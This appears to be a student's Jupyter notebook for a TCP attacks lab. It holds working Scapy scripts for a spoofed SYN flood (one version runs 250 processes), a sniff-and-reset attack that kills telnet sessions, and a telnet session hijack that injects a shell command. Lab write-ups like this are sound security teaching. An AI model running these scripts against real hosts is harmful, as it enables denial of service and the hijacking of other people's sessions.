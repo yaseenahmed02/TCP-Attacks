{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Lab Description\n",
    "\n",
    "In this lab, we first explore TCP vulnerabilities through a SYN flooding attack to understand how excessive SYN requests can overwhelm a system's queue for half-open connections, preventing new connections. Next, they conduct a TCP reset attack to terminate an established TCP connection, highlighting the importance of secure session management. Finally, they execute a TCP session hijacking attack, demonstrating the potential for malicious command injection into an active session to manipulate or disrupt typical network communications.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 1\n",
    "\n",
    "In this task, we attempt to execute a SYN flooding attack, where the goal is to overwhelm a victim's TCP port with excessive SYN requests without completing the 3-way handshake. This method floods the queue for half-open connections, preventing the system from accepting new legitimate connections and leading to a denial of service.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 1A\n",
    "\n",
    "Launch a SYN flood to overload the target server's connection queue with incomplete requests.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We execute this script on the attacker's side to generate and send a flood of incomplete SYN requests to the target server, testing its handling of such attacks.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/bin/env python3\n",
    "from scapy.all import IP, TCP, send\n",
    "from ipaddress import IPv4Address\n",
    "from random import getrandbits\n",
    "\n",
    "victim_ip = \"10.9.0.5\"\n",
    "destination_port = 23\n",
    "\n",
    "ip = IP(dst=victim_ip)\n",
    "tcp = TCP(dport=destination_port, flags=\"S\")\n",
    "pkt = ip / tcp\n",
    "\n",
    "while True:\n",
    "    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # Randomize the source IP address\n",
    "\n",
    "    pkt[TCP].sport = getrandbits(16)  # Randomize the source port\n",
    "\n",
    "    pkt[TCP].seq = getrandbits(32)  # Randomize the sequence number\n",
    "\n",
    "    send(pkt, verbose=0)  # Send the packet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. The attack is unsuccessful because the telnet command could connect to the victim machine, indicating the SYN flood didn't prevent the connection.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. The strategy involved launching a SYN flood attack by continuously sending TCP SYN packets to the victim's IP address, with each packet having a randomly generated source IP and port. This should have overloaded the victim’s TCP stack, preventing legitimate connections from being established.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4. Screenshot showing the usage of the telnet command\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Question2](./1a/telnet.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 5. Screenshot of the output of netstat -nat on the victim machine\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Question5](./1a/Q5.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 1B\n",
    "\n",
    "We attempt to mitigate a SYN flood attack by flushing the TCP metrics on the victim machine, aiming to clear any cached successful connection data and test if previously connected clients could be affected during the attack.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We begin by flushing the TCP metrics on the Victim Machine using `ip tcp_metrics flush`\n",
    "\n",
    "Clearing the TCP metrics means that the victim machine no longer retains information about previous connections, including those that might be considered \"proven\" and allowed quicker connections even during an attack. This should make the victim more vulnerable to the SYN flooding attack, as the TCP cache that helps to mitigate such attacks by reserving slots for known IPs has been reset.\n",
    "\n",
    "![Question5](./1b/flush.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We then Attempt Telnet Connection from User 1 to Victim During Attack\n",
    "\n",
    "Command: `telnet 10.9.0.5`\n",
    "\n",
    "![Question5](./1b/telnet.png)\n",
    "\n",
    "Despite the execution of a flush on the TCP metrics aimed at clearing cached connections on the victim machine, the user from terminal 10.9.0.6 still managed to establish a successful connection during the SYN flood attack, indicating that the attack failed to disrupt service for previously known clients. This suggests a limitation in the mitigation strategies employed, where flushing TCP metrics does not fully counteract SYN flood attacks under certain conditions.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The `netstat -nat` output on the victim machine shows numerous connections in the `SYN_RECV` state, indicating that multiple SYN requests have been received but not yet acknowledged. This suggests that the SYN flood attack is actively attempting to overwhelm the server's capacity to handle new connections, although it failed to block connections from previously recognized IP addresses.\n",
    "\n",
    "![Question5](./1b/netstat.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 1C\n",
    "\n",
    "We attempt to mitigate a SYN flood attack by flushing the TCP metrics on the victim machine, aiming to clear any cached successful connection data and test if previously connected clients could be affected during the attack.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We begin by adjusting TCP Retries on Victim by running `sysctl net.ipv4.tcp_synack_retries=5`\n",
    "\n",
    "This command sets the number of SYN+ACK retransmissions that the TCP stack will attempt on the victim machine before giving up on a half-open connection.\n",
    "\n",
    "![Question5](./1c/retries.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We run multiple instances of the attack from the attacker machine\n",
    "\n",
    "We modify the code to run it through multiple processes as follows\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/bin/env python3\n",
    "from scapy.all import IP, TCP, send\n",
    "from ipaddress import IPv4Address\n",
    "from random import getrandbits\n",
    "from multiprocessing import Process\n",
    "\n",
    "victim_ip = \"10.9.0.5\"\n",
    "destination_port = 23\n",
    "\n",
    "\n",
    "def syn_flood():\n",
    "    ip = IP(dst=victim_ip)\n",
    "    tcp = TCP(dport=destination_port, flags=\"S\")\n",
    "    pkt = ip / tcp\n",
    "\n",
    "    while True:\n",
    "        pkt[IP].src = str(\n",
    "            IPv4Address(getrandbits(32))\n",
    "        )  # Randomize the source IP address\n",
    "        pkt[TCP].sport = getrandbits(16)  # Randomize the source port\n",
    "        pkt[TCP].seq = getrandbits(32)  # Randomize the sequence number\n",
    "        send(pkt, verbose=0)  # Send the packet\n",
    "\n",
    "\n",
    "processes = []\n",
    "\n",
    "n = 250  # number of proccesses\n",
    "\n",
    "for _ in range(n):\n",
    "    p = Process(target=syn_flood)\n",
    "    p.start()\n",
    "    processes.append(p)\n",
    "\n",
    "for process in processes:\n",
    "    process.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We run `netstat -nat | grep SYN_RECV` to monitor the attack from the victim's machine\n",
    "\n",
    "![Question5](./1c/netstat.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From User 1 Terminal, while the SYN flood attack is running, we attempt to telnet into the victim machine\n",
    "\n",
    "![Question5](./1c/timeout.png)\n",
    "\n",
    "1. The telnet attempt timed out, demonstrating that the SYN flood attack was successful in overloading the victim's network, resulting in a denial of service. The attack effectively saturated the TCP connection queue, thereby blocking new legitimate connections.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We also check the number of connections on the victim machine using `netstat -nat | grep SYN_RECV | wc -l`\n",
    "\n",
    "![Question5](./1c/connections.png)\n",
    "\n",
    "The `netstat` command output showing 128 connections in the `SYN_RECV` state confirms that the SYN flood attack generated a significant number of half-open connections on the victim machine.\n",
    "\n",
    "2. The deployment of 128 instances, as indicated by the netstat count of SYN_RECV connections, was effective in severely impacting the network's ability to process connections. This number of instances can be considered a baseline for achieving a successful attack under similar network conditions and system configurations.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 2: TCP RST attack\n",
    "\n",
    "The objective is to perform a TCP RST attack to break an established telnet connection between two users, A and B, by crafting and sending a spoofed TCP RST packet using Scapy. The attacker is on the same LAN and can observe the traffic between A and B.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We begin by preparing the Victim and Server for Telnet Session\n",
    "\n",
    "On the Victim (10.9.0.5) container, we initiate a telnet session to User1 (10.9.0.6). This will establish the TCP connection that you will later attempt to reset.\n",
    "\n",
    "`telnet 10.9.0.6`\n",
    "\n",
    "![Question5](./2/telnet.png)\n",
    "\n",
    "We see that the telnet connection is successfuly\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we run a script on the Attacker (seed-attacker) container, to monitor traffic between the Victim (10.9.0.5) and the User1 (10.9.0.6). The goal is to capture a packet that belongs to the telnet session. The attacker needs to capture this to obtain the sequence number necessary for crafting the RST packet.\n",
    "\n",
    "The code is as follows:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "victim_ip = \"10.9.0.5\"\n",
    "server_ip = \"10.9.0.6\"\n",
    "server_port = 23  # telnet port\n",
    "attacker_interface = \"br-2837639e6df7\"\n",
    "\n",
    "\n",
    "def spoof_and_reset(pkt):\n",
    "    print(\"Received packet:\")\n",
    "    print(pkt.summary())\n",
    "\n",
    "    tcp_packet = pkt[TCP]\n",
    "    seq_num = tcp_packet.seq\n",
    "    print(\n",
    "        \"Sequence number of the received packet:\", seq_num\n",
    "    )  # Print the sequence number\n",
    "\n",
    "    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)\n",
    "    tcp = TCP(\n",
    "        sport=tcp_packet.dport, dport=tcp_packet.sport, flags=\"R\", seq=tcp_packet.ack\n",
    "    )\n",
    "    pkt = ip / tcp\n",
    "\n",
    "    print(\"Sending spoofed packet:\")\n",
    "    print(pkt.summary())  # Print a summary of the spoofed packet\n",
    "\n",
    "    send(pkt, verbose=0, iface=attacker_interface)\n",
    "\n",
    "\n",
    "# Start sniffing for packets\n",
    "filter = f\"tcp and src host {victim_ip} and dst host {server_ip} and dst port 23\"\n",
    "print(\n",
    "    f\"Sniffing on interface {attacker_interface} for packets matching filter: {filter}\"\n",
    ")\n",
    "sniff(filter=filter, prn=spoof_and_reset, iface=attacker_interface)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Right after running the code, the program begins sniffing on the specified interface for TCP packets sent from 10.9.0.5 to 10.9.0.6 on port 23 (Telnet)\n",
    "\n",
    "![Question5](./2/init_sniff.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When attempting a Telnet connection, the system unexpectedly terminates, displaying \"Connection closed by foreign host.\" This interruption occurs due to the attacker running a script that intercepts TCP packets targeting the Telnet server. The script disrupts the connection by sending forged TCP packets with the RST (Reset) flag set, effectively ending Telnet sessions initiated by the victim.\n",
    "\n",
    "![Question5](./2/telnet_close.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "On the attacker machine, we observe the script receiving Telnet packets from the victim machine (10.9.0.5) destined for the Telnet server (10.9.0.6) on port 23. The script identifies the sequence number of the received packets and subsequently sends forged TCP packets with the reset (R) flag set to terminate the Telnet connection abruptly. This process is repeated each time a Telnet packet is intercepted, effectively disrupting ongoing Telnet sessions initiated by the victim.\n",
    "\n",
    "![Question5](./2/attacker.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Conclusion\n",
    "\n",
    "The attack was successful because the attacker's script effectively intercepted Telnet packets from the victim machine, identified their sequence numbers, and sent forged TCP packets with reset flags to terminate the Telnet connections abruptly. This disruption was evident from the \"Connection closed by foreign host\" messages observed on the victim's side, indicating the termination of Telnet sessions.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3: TCP Session Hijacking\n",
    "\n",
    "In this task, the goal is to demonstrate TCP Session Hijacking by hijacking a Telnet session between two machines on the same LAN. The attacker intercepts Telnet packets, identifies the sequence numbers, and sends forged TCP packets with reset flags to abruptly terminate the Telnet connections. Ultimately, the objective is to inject a malicious command into the Telnet session, causing the Telnet server to create a new file named \"success\" in the /tmp directory upon receiving the tenth character.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We begin by opening a Telnet session from the Victim the server (10.9.0.6)\n",
    "\n",
    "![Question5](./3/telnet_init.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We run an `ls` command to view the files on the server\n",
    "\n",
    "![Question5](./3/ls1.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we run the following script on the attackers machine, this script does this\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "# Server and victim IP addresses\n",
    "server_ip = \"10.9.0.6\"\n",
    "victim_ip = \"10.9.0.5\"\n",
    "\n",
    "# Interface to use for packet sniffing and sending\n",
    "iface_name = \"br-2837639e6df7\"\n",
    "\n",
    "# Variable to track the number of characters seen\n",
    "chars_seen = 0\n",
    "\n",
    "\n",
    "# Function to handle each sniffed packet\n",
    "def spoof(pkt):\n",
    "    global chars_seen  # Declare as global to modify the variable defined outside this function\n",
    "\n",
    "    if TCP in pkt and len(pkt[TCP].payload):\n",
    "        chars_seen += len(pkt[TCP].payload)\n",
    "        print(f\"Total characters seen: {chars_seen}\")\n",
    "        print(f\"Current SEQ: {pkt[TCP].seq}, Current ACK: {pkt[TCP].ack}\")\n",
    "\n",
    "        if chars_seen >= 10:\n",
    "            new_seq = pkt[TCP].seq + 10\n",
    "            new_ack = pkt[TCP].ack + 1\n",
    "\n",
    "            # Prepare the malicious packet to hijack the session\n",
    "            ip_layer = IP(src=victim_ip, dst=server_ip)\n",
    "            tcp_layer = TCP(\n",
    "                sport=pkt[TCP].sport, dport=23, flags=\"A\", seq=new_seq, ack=new_ack\n",
    "            )\n",
    "            payload = \";touch /tmp/success \\n\"\n",
    "            malicious_pkt = ip_layer / tcp_layer / payload\n",
    "\n",
    "            # Send the malicious packet\n",
    "            send(malicious_pkt, verbose=0, iface=iface_name)\n",
    "            print(\"Malicious packet sent. Check /tmp/success on the server.\")\n",
    "            print(\"Hijack attempt made. Exiting program.\")\n",
    "            quit()  # Ensure quit is within the condition to execute only after the hijack attempt\n",
    "\n",
    "\n",
    "# Start sniffing for Telnet packets on the specified interface\n",
    "print(\"Starting to sniff on interface...\")\n",
    "sniff(\n",
    "    iface=iface_name,\n",
    "    filter=f\"tcp and src host {victim_ip} and dst host {server_ip} and dst port 23\",\n",
    "    prn=spoof,\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After the victim types the 10th character (' j ') during the Telnet session with the server at IP address 10.9.0.6, the session becomes unresponsive, and the victim cannot type anymore. This is when the hijacking happens. The attacker has specifically crafted a malicious packet that, once integrated into the session after the 10th character, disrupts the session's normal operation.\n",
    "\n",
    "![Question5](./3/hijack.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As the script captures each character entered by the victim, it displays the sequence and acknowledgment numbers associated with each TCP packet. After the 10th character is captured, the script successfully injects a malicious packet intended to hijack the session.\n",
    "\n",
    "![Question5](./3/attacker.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can also see that the success file has been created on the server\n",
    "\n",
    "![Question5](./3/success.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. **Was the attack successful? Explain.**\n",
    "\n",
    "   - Yes, the attack was successful. The attacker's script managed to send a malicious packet that executed a command (`touch /tmp/success`) on the server after observing 10 characters in the Telnet session. This shows the script was able to inject and execute commands remotely.\n",
    "\n",
    "3. **Describe and explain your strategy to complete the attack.**\n",
    "   - The strategy involved monitoring the victim's Telnet session to count the number of characters typed and then automatically injecting a malicious packet once the 10-character threshold was reached. This packet was crafted to execute a command on the server, demonstrating control over the session without the victim's knowledge, exploiting the established trust between the victim and the server.\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
